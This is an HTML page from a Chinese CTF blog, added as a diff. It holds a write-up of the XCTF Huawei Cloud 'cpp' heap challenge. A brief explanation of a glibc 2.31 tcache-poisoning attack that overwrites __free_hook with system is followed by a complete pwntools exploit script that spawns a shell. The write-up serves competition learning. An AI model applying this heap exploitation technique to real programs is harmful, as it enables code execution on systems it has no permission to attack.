@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+    
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta name="renderer" content="webkit"/>
+    <meta name="force-rendering" content="webkit"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <script>if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode)) window.location.href="https://support.dmeng.net/upgrade-your-browser.html?referrer="+encodeURIComponent(window.location.href); </script>
+    
+    
+        <link rel="shortcut icon" href="/img/favicon.ico">
+    
+     
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.13.1/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/vuetify@2.2.30/dist/vuetify.min.css" rel="stylesheet">
+    
+<link rel="stylesheet" href="/css/main.css">
+
+    
+    
+
+
+
+
+
+
+
+    
+    
+          
+
+    
+    
+    
+    
+    <title>
+        
+            XCTF 华为三场 | Clindy&#39;s Blog
+        
+    </title>
+    
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+<body>
+    <div id="app">
+        <v-app>
+            <v-content id="page">
+                <v-container fluid>
+                    <v-row>
+                        <v-col cols="2" class="d-none d-md-block">
+                            <div id="sidebar" class="float-right">
+    <a href="/" rel="home">
+        <v-avatar size=96>
+            <img id="logo" src="/img/head.jpg">     
+        </v-avatar> 
+    </a>
+    <v-divider></v-divider>
+    <div class="mini-menu">
+        <v-btn icon href="/">
+            <v-icon>home</v-icon>
+        </v-btn>
+        <v-btn icon href="/categories/">
+            <v-icon>folder</v-icon>
+        </v-btn>
+        <v-btn icon href="/tags/">
+            <v-icon>bookmark</v-icon>
+        </v-btn>
+        <v-btn icon @click="SetNightMode">
+            <v-icon>{{ nightMode }}</v-icon>
+        </v-btn>
+    </div>
+    <v-list id="main-menu" class="font-weight-bold" flat>
+        
+            
+            <v-list-item href="/classic/" link>
+            <v-list-item-icon><v-icon>account_circle</v-icon></v-list-item-icon>
+            <v-list-item-content>
+                经典例题
+            </v-list-item-content>
+            </v-list-item>
+        
+            
+            <v-list-item href="/archives/" link>
+            <v-list-item-icon><v-icon>archive</v-icon></v-list-item-icon>
+            <v-list-item-content>
+                时间线
+            </v-list-item-content>
+            </v-list-item>
+        
+    </v-list>
+    <v-divider></v-divider>
+    
+        <div class="post-toc">
+            <a href="/2021/01/11/Game/%E5%8D%8E%E4%B8%BA/" class="toc-header">Table of Contents</a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%8E%E4%B8%BA%E4%BA%91%E4%B8%93%E5%9C%BA"><span class="toc-number">1.</span> <span class="toc-text">华为云专场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cpp"><span class="toc-number">1.1.</span> <span class="toc-text">cpp</span></a></li></ol></li></ol>
+            </div>
+        </div>
+    
+
+    <div id="footer">
+        <div class="footer-social">
+            
+                
+                <v-btn icon href="mailto:clindy.h@qq.com" target="_blank">
+                    <v-icon>fas fa-envelope</v-icon>
+                </v-btn>
+            
+                
+                <v-btn icon href="https://github.com/" target="_blank">
+                    <v-icon>fab fa-github</v-icon>
+                </v-btn>
+            
+                
+                <v-btn icon href="https://baidu.com" target="_blank">
+                    <v-icon>fab fa-weibo</v-icon>
+                </v-btn>
+            
+                
+                <v-btn icon href="https://baidu.com" target="_blank">
+                    <v-icon>fab fa-qq</v-icon>
+                </v-btn>
+            
+        </div>
+        <v-divider></v-divider>
+        <div class="footer-content">
+            
+                <span id="busuanzi_container_site_uv" style="display: none;"> 
+                    Total Visitors <span id="busuanzi_value_site_uv"></span>
+                </span>
+                <br>
+            
+            <span>Theme: <a target="_blank" rel="noopener" href="https://github.com/kb1000fx/hexo-theme-insulin">Insulin</a></span><br>
+            <span>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a></span><br>
+            <span>
+                &copy; 2020 - 2021 
+                Clindy
+            </span>
+        </div>
+    </div>
+</div>
+
+                        </v-col>
+                        <v-col cols="12" md="10">
+                            <v-row>
+  <v-col cols="12" md="8" align-self="end">
+    <div id="site-header">
+      <div id="site-title">
+        <a href="/" rel="home">Clindy&#39;s Blog</a>
+      </div>
+      <div id="site-description">像风走了八千里，不问归期</div>
+      <div id="mobile-menu" class="d-block d-md-none">
+        <v-text-field label="请输入关键字" data-src="search.xml" v-model="searchHeaderValue" prepend-inner-icon="search" clearable clear-icon="clear" @keydown.enter="EnterSearch(searchHeaderValue,false)"></v-text-field>
+        <div class="mobile-mini-menu">
+          <v-btn icon href="/">
+              <v-icon>home</v-icon>
+          </v-btn>
+          <v-btn icon href="/categories/">
+              <v-icon>folder</v-icon>
+          </v-btn>
+          <v-btn icon href="/tags/">
+              <v-icon>bookmark</v-icon>
+          </v-btn>
+          <v-btn icon @click="SetNightMode">
+              <v-icon>{{ nightMode }}</v-icon>
+          </v-btn>
+          
+            
+            <v-btn icon href="/classic/">
+              <v-icon>account_circle</v-icon>
+            </v-btn>
+          
+            
+            <v-btn icon href="/archives/">
+              <v-icon>archive</v-icon>
+            </v-btn>
+          
+        </div>
+      </div>    
+    </div>
+  </v-col>  
+  <v-col cols="4" align-self="end" class="d-none d-md-block">
+    <v-col align-self="end">
+      <v-text-field label="请输入关键字" data-src="search.xml" v-model="searchHeaderValue" prepend-icon="search" clearable clear-icon="clear" @keydown.enter="EnterSearch(searchHeaderValue,false)"></v-text-field>
+    </v-col> 
+  </v-col>
+</v-row>
+
+                            <v-card class="elevation-2 post-card">
+    
+    
+        <div class="post-header">
+  <a class="post-header-title font-weight-medium" href="/2021/01/11/Game/%E5%8D%8E%E4%B8%BA/">XCTF 华为三场</a>
+  <div class="post-header-meta">   
+    <span>
+      <v-icon color="">event</v-icon>
+      Posted on:&nbsp;2021-01-11
+    </span>
+    <span>
+      <v-icon color="">event_available</v-icon>
+      Edited on:&nbsp;2021-01-14
+    </span>
+    <span>
+      <v-icon color="">folder</v-icon>
+      In:&nbsp;<a class="category-link" href="/categories/Game/">Game</a>
+    </span>
+    
+    <span>
+      <v-icon color="">visibility</v-icon>
+      Views:&nbsp;<span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span></span>
+    </span>
+    
+  </div>
+</div>
+
+    
+    
+    
+    
+    <div class="post-content typo">
+        <h2 id="华为云专场"><a href="#华为云专场" class="headerlink" title="华为云专场"></a>华为云专场</h2><p>太难了。</p>
+<h3 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h3><p>2.31保护全开的菜单堆。有两个功能，0是add，申请大小为0x8的堆块，并往索引处写入值，如果索引处有堆块，则会把原来的堆块会被free掉；1是delelte，free掉索引处的堆块，后打印堆块的值，最后可以往堆块里写东西。</p>
+<p>可以利用选项1，free后泄露堆块地址。之后利用free后可以改fd的指针的功能，把堆块add到其它堆块的SIZE位，将其改成0x200，add的索引就选择要覆盖的堆块的索引，让该堆块主动进入tcache。重复7次填满tcache，再释放unsorted bin泄露出libc，最后改freehook为system。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal=[<span class="string">&quot;open-wsl.exe&quot;</span>,<span class="string">&quot;-c&quot;</span>]</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">file = <span class="string">&quot;./chall&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,content=<span class="string">&quot;aaaaaaa&quot;</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,content)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx,content=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    fd = p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    <span class="keyword">return</span> fd[<span class="number">1</span>:-<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(file)</span><br><span class="line">    elf = process(file)</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;set $s=$rebase(0x42E0)&quot;)</span></span><br><span class="line"></span><br><span class="line">COUNT = <span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(COUNT+<span class="number">20</span>):</span><br><span class="line">    add(i)</span><br><span class="line"></span><br><span class="line">delete(COUNT)</span><br><span class="line">leak = delete(COUNT+<span class="number">1</span>)</span><br><span class="line">heap = u64(leak.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x11ff0</span></span><br><span class="line">info(<span class="string">&quot;heap &lt;============ 0x%x&quot;</span>,heap)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(COUNT+<span class="number">12</span>+i)</span><br><span class="line">    delete(COUNT+<span class="number">2</span>+i,p64(heap+<span class="number">0x11ea8</span>+i*<span class="number">0x20</span>)[:-<span class="number">1</span>])</span><br><span class="line">    add(COUNT+<span class="number">2</span>+i)</span><br><span class="line">    add(i,p16(<span class="number">0x201</span>))</span><br><span class="line"></span><br><span class="line">delete(COUNT+<span class="number">12</span>+<span class="number">7</span>)</span><br><span class="line">delete(COUNT+<span class="number">2</span>+<span class="number">7</span>,p64(heap+<span class="number">0x11ea8</span>+<span class="number">7</span>*<span class="number">0x20</span>)[:-<span class="number">1</span>])</span><br><span class="line">add(COUNT+<span class="number">2</span>+<span class="number">7</span>)</span><br><span class="line">add(<span class="number">18</span>,p16(<span class="number">0x201</span>))</span><br><span class="line"></span><br><span class="line">leak = delete(<span class="number">7</span>)</span><br><span class="line">libc.address = u64(leak.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">2014176</span></span><br><span class="line">info(<span class="string">&quot;libc.address &lt;============ 0x%x&quot;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">add(<span class="number">100</span>,<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">delete(<span class="number">12</span>,p64(libc.sym[<span class="string">&quot;__free_hook&quot;</span>])[:-<span class="number">1</span>])</span><br><span class="line">add(<span class="number">101</span>)</span><br><span class="line">add(<span class="number">102</span>,p64(libc.sym[<span class="string">&quot;system&quot;</span>])[:-<span class="number">1</span>])</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </div>
+    <!--文末结束语-->
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;"> --- 本文结束 <i class="fas fa-heart"></i> The End --- </div>
+    
+    <!--页脚广告-->
+    
+    <v-divider></v-divider>
+    
+    <div class="post-nav">             
+        
+            <div class="post-nav-button float-left">
+                <v-icon>chevron_left</v-icon>
+                <a class="font-weight-bold text-left" href="/2021/01/14/CVE/CVE-2018-1160/">
+                    CVE-2018-1160
+                </a>
+            </div>
+              
+          
+            <div class="post-nav-button float-right">
+                <a class="font-weight-bold text-right" href="/2020/12/30/Game/2020%20%E7%BA%B5%E6%A8%AA%E6%9D%AF/">      
+                    2020 纵横杯
+                </a>
+                <v-icon>chevron_right</v-icon>
+            </div>
+        
+    </div>
+</v-card>
+
+
+
+        
+                            <div id="mobile-footer" class="d-block d-md-none">
+                                <v-divider></v-divider>
+                                <div id="mobile-footer-content">
+                                    <span>Theme: <a target="_blank" rel="noopener" href="https://github.com/kb1000fx/hexo-theme-insulin">Insulin</a> &nbsp; Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a></span><br>
+                                    <span> &copy; 2020 - 2021 Clindy</span>
+                                </div>
+                            </div>                   
+                        </v-col>                                            
+                    </v-row>
+                </v-container>
+            </v-content>
+        </v-app>
+    </div>
+    
+<script src="https://cdn.jsdelivr.net/npm/vue@2.6.11"></script>
+<script src="https://cdn.jsdelivr.net/npm/vuetify@2.2.30"></script>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/js-base64@3.5.2/base64.min.js"></script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@8.4.8/dist/mermaid.min.js"></script>
+    <script>mermaid.initialize({
+        startOnLoad: true,
+        theme: "default"
+    });</script>
+
+
+
+
+
+</body>
+</html>
